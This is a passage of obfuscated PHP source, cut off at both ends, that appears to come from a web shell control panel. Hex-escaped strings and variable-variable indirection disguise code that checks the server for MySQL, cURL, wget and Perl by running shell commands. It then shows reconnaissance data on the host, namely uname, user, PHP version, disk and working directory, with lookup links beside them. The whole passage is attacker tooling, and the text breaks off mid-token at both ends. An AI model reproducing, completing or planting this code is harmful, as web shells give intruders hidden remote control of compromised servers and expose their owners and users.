sx}/1073741824)."\x20\x47\x42";elseif(${${"\x47\x4cOB\x41\x4cS"}["d\x65\x73\x76\x6b\x70r"]}>=1048576)return sprintf("\x251.2f",${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x64\x65s\x76k\x70r"]}/1048576)." \x4dB";elseif(${${"\x47L\x4f\x42\x41\x4cS"}["\x6ay\x65f\x67\x67\x6f\x79w\x66\x6a"]}>=1024)return sprintf("\x25\x31.\x32f",${$gxbctrttrp}/1024)."\x20KB";else return${${"G\x4c\x4f\x42A\x4cS"}["\x6b\x61\x75\x6a\x71\x6d\x61\x66\x77\x76\x6c"]}."\x20\x42";}function testmysql(){if(function_exists("my\x73\x71\x6c_co\x6en\x65\x63\x74")){return showstat("o\x6e");}else{return showstat("o\x66f");}}function testcurl(){if(function_exists("\x63\x75r\x6c_ve\x72sio\x6e")){return showstat("o\x6e");}else{return showstat("\x6ff\x66");}}function testwget(){if(ex("\x77\x67et --\x68\x65lp")){return showstat("\x6fn");}else{return showstat("o\x66f");}}function testperl(){if(ex("pe\x72\x6c\x20-\x68")){return showstat("\x6f\x6e");}else{return showstat("of\x66");}}echo"\x3c\x73pan\x20cl\x61s\x73\x3d\x69\x6e\x66o>\x26\x6ebsp;MyS\x51L: ".testmysql()."&\x6eb\x73\x70\x3b|\x26n\x62s\x70\x3b\x50er\x6c: ".testperl()."&nbs\x70\x3b|\x26\x6ebs\x70\x3b\x63\x55\x52\x4c:\x20".testcurl()."&\x6e\x62\x73\x70\x3b|&\x6ebsp\x3b\x57G\x65\x74:\x20".testwget()."\x3c\x62r>";echo"\x3c\x74\x61b\x6ce\x20\x63\x6cass=\x69\x6efo\x20\x63\x65l\x6cp\x61d\x64ing=3\x20\x63\x65llspacing\x3d0 w\x69\x64t\x68\x3d1\x300%\x3e<t\x72\x3e<t\x64\x20\x77\x69\x64\x74h=1>\x3cs\x70a\x6e>Un\x61\x6d\x65:<br>\x55\x73\x65r:\x3cb\x72\x3ePh\x70:\x3cbr\x3eHdd:\x3cbr>C\x77\x64:".($GLOBALS["\x6fs"]=="w\x69n"?"<br>\x44\x72i\x76es:":"")."</spa\x6e\x3e\x3c/t\x64\x3e"."\x3c\x74\x64\x3e\x3c\x6eob\x72>".substr(@php_uname(),0,120)." \x20\x3ca\x20h\x72e\x66=\"\x68t\x74p://w\x77w\x2ego\x6fgle.\x63\x6fm/\x73e\x61\x72\x63h?q\x3d".urlencode(@php_uname())."\" t\x61\x72g\x65\x74=\"\x5f\x62\x6ca\x6e\x6b\x22>[\x47oo\x67\x6ce]\x3c/a\x3e\x20<\x61 \x68\x72\x65\x66=\x22".${${"G\x4cO\x42AL\x53"}["n\x76\x79je\x6f\x6e\x70"]}."\x22 \x74\x61\x72\x67\x65\x74=\x5f\x62\x6cank>[Ex\x7